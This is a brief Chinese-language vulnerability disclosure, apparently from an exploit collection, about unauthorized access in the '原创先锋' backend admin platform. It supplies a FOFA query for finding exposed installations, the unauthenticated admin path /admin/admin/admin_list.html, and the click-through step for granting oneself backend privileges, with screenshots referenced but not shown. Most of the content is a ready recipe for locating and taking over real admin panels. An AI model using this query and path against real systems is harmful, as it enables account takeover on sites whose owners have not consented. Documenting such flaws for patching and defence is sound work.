# 原创先锋 后台管理平台 未授权访问漏洞


## 漏洞描述


原创先锋 后台管理平台 存在未授权访问漏洞，攻击者通过漏洞可以任意接管账户权限



## 漏洞影响


```plain
原创先锋 后台管理平台
```



## FOFA


```plain
body="https://www.bjycxf.com"
```



## 漏洞复现


后台登陆页面如下



![202202170900160.png](/uploads/20260518/9e3ad07b-cba9-47ab-b46c-db90e165df50.png)



未授权的Url



```plain
/admin/admin/admin_list.html
```



![202202170901271.png](/uploads/20260518/e14f0982-d5d9-4e75-b2b8-8f0d57908666.png)



点击添加并授权即可获取后台模块权限
